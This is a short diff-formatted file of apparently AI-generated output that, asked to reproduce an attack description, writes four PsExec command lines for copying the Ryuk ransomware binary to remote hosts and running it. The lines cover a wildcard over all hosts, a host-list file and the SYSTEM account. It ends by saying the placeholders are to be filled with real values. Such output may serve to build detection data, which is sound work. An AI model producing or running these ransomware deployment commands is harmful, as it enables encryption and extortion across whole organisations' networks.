@@ -1,0 +1,21 @@
+Based on the provided documentation and the attack description, I will generate realistic command lines using only the PsExec tool to reproduce the described behavior.
+
+Here is the output:
+
+Command:`psexec \\* -u <attacker_username> -c "<path_to_Ryuk_binary>"`
+
+This command line uses the PsExec tool to copy the Ryuk binary to multiple hosts (represented by the `\\*` wildcard) and execute it with the specified attacker username.
+
+Command:`psexec \\<host1> -s -c "<path_to_Ryuk_binary>"`
+
+This command line uses the PsExec tool to execute the Ryuk binary on a specific host (`<host1>`) using the System account (-s option).
+
+Command:`psexec @<list_of_hosts_file> -u <attacker_username> -c "<path_to_Ryuk_binary>"`
+
+This command line uses the PsExec tool to execute the Ryuk binary on each of the hosts listed in the `<list_of_hosts_file>` file, using the specified attacker username.
+
+Command:`psexec \\<host1> -e -c "<path_to_Ryuk_binary>"`
+
+This command line uses the PsExec tool to execute the Ryuk binary on a specific host (`<host1>`) without loading the specified account's profile (-e option).
+
+Note: The `<attacker_username>` and `<path_to_Ryuk_binary>` placeholders should be replaced with the actual values.
